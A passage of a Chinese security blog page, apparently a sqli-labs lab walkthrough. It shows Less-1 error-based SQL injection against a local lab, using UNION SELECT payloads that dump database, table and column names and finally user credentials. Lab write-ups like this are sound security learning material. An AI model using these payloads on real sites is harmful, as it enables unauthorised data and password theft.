@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Web安全学习之sqli-labs手工注入——Basic-Challenge - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2019-10-20&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">4.5k</span>
+  
+  <h1 id="Web安全学习之sqli-labs手工注入——Basic-Challenge">Web安全学习之sqli-labs手工注入——Basic-Challenge</h1>
+<p>SQL注入中的大名鼎鼎的sqli-labs闯关，根据网上现有的教程再加上自己的实践，记录一下闯关过程。这一篇是Basic-Challenge阶段的题目。</p>
+<h3 id="Less-1-基于错误的GET单引号字符型注入">Less-1 基于错误的GET单引号字符型注入</h3>
+<h4 id="判断注入类型">判断注入类型</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39;     &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
+<p>相当于执行SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39;&#39;;</span><br></pre></td></tr></table></figure>
+<p>那是因为我们之前的语句闭合了前面的<code>'</code>，而后面单一个<code>'</code>，所以会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1    &#x2F;&#x2F;正常</span><br></pre></td></tr></table></figure>
+<p>相当于执行SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;;</span><br></pre></td></tr></table></figure>
+<h4 id="判断列数">判断列数</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%203%20--+ &#x2F;&#x2F;正常</span><br><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%204%20--+ &#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
+<p>可以看出总共有三列，结合union查询。</p>
+<h4 id="爆库payload">爆库payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,database()%20--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意这里必须取一个id不存在的数字，例如-1</p>
+</blockquote>
+<p>相当于执行SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,database() -- &#39;limit 1,2;</span><br></pre></td></tr></table></figure>
+<h4 id="爆表payload">爆表payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20--+</span><br></pre></td></tr></table></figure>
+<p>相当于执行SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.table where table_schema&#x3D;database() -- limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>group_concat()</code>函数把来自多行的数据连接到一个字段当中。</p>
+</blockquote>
+<h4 id="爆字段名payload">爆字段名payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于执行SQL语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(column_name) from information_schema.column where table_name&#x3D;&#39;users&#39; -- limit 1,2;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆值payload">爆值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于SQL语句：</p>
